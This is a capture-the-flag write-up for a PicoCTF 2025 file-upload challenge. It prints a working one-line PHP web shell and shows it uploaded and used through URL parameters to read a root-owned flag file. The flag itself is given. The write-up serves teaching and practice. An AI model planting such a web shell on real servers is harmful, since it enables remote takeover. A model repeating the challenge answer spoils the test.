# 💣 Challenge: File Upload RCE — Remote Code Execution via Web Shell

**Category:** Web Exploitation  
**CTF:** PicoCTF 2025  
**Flag:** `picoCTF{wh47_c4n_u_d0_wPHP_f7424fc7}`

---

## 📝 Description

> A developer has added profile picture upload functionality to a website. However, the implementation is flawed, and it presents an opportunity for you.  
>  
> Your mission is to navigate to the provided web page and locate the file upload area. Your ultimate goal is to find the hidden flag located in the `/root` directory.

Once the instance is launched, it redirects to a live webpage with a file upload form — supposedly for uploading profile pictures.

---

## 🔍 Initial Recon

The website displayed an image upload feature with a standard form. After uploading a file, it returned the path to the uploaded file in the `/uploads/` directory on the server.

This hinted at a potential **Remote Code Execution (RCE)** vulnerability via improper file type validation.

---

## 🐚 Step 1: Crafting a Web Shell

We created a simple **PHP web shell** file named `shell.php` with the following content:

```
<?php system($_GET['cmd']); ?>
```

🔍 What it does:
1. system() executes the given command on the server.
2. $_GET['cmd'] retrieves the cmd parameter from the URL.
3. The output is directly shown in the browser.

Example usage:

```
http://<server>/uploads/shell.php?cmd=whoami
```

## 📤 Step 2: Uploading the Shell

After uploading shell.php, the application returned the file's path:

`/uploads/shell.php`

Accessing this path confirmed that the shell executed commands passed via the URL.

## 🏁 Step 3: Retrieving the Flag

Using our shell, we executed the following command:

`http://standard-pizzas.picoctf.net:62860/uploads/shell.php?cmd=sudo cat /root/flag.txt`

The server responded with:

`picoCTF{wh47_c4n_u_d0_wPHP_f7424fc7}`

## 🏴 Final Flag

`picoCTF{wh47_c4n_u_d0_wPHP_f7424fc7}`

## ⚙️ Tools & Techniques Used

    PHP-based web shell

    File upload abuse

    Command injection via GET parameters

    URL encoding and command chaining

## 📚 Resources

    Acunetix: Introduction to Web Shells – Using PHP

## ⚠️ Disclaimer

This writeup is for educational purposes only. Exploiting file upload vulnerabilities without permission is illegal and unethical. Always practice responsible disclosure and adhere to legal guidelines.




